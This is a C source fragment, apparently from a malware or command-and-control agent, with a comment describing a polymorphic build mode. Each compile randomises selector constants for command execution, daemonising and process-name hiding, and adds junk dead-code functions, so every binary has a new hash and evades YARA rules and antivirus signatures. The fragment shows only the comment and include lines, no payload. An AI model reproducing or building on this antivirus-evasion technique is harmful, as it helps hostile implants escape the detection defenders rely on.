/* ── Polymorphic build: binary mutation per compilation ────────────────
 * What this does:
 *   Each time the agent is compiled in "poly" mode, it produces a binary
 *   that is functionally identical but structurally different:
 *   - poly_cfg.h  : random POLY_* selector constants (#define POLY_EXEC_CMD 2,
 *                   POLY_DAEMON 3, POLY_HIDE_NAME 2, etc.). These steer
 *                   #if POLY_* branches throughout the code, so the compiler
 *                   emits different instruction sequences for the same logic.
 *   - poly_stubs.h: dead-code "junk" functions (never called at runtime) that
 *                   are forced into .text via POLY_CALL_CHAIN(). They inflate
 *                   the binary with unique, varied code patterns, making static
 *                   signature matching (YARA rules, AV hash databases) fail.
 *
 * Generated by: tools/gen_poly_cfg.py  and  tools/gen_poly_stubs.py
 * before each compile. Each build → different SB_KEY, PN_KEY, POLY_* values,
 * different dead-code functions → different SHA-256, different YARA match rate.
 *
 * Not present in normal (non-poly) builds → all #if POLY_* blocks fall through
 * to the #else default, identical to the original code (no functional change). */
#ifdef USE_POLY_CFG
#include "poly_cfg.h"    /* POLY_EXEC_CMD, POLY_DAEMON, POLY_HIDE_NAME, etc. */
#include "poly_stubs.h"  /* dead-code junk functions + POLY_CALL_CHAIN() macro */
#endif

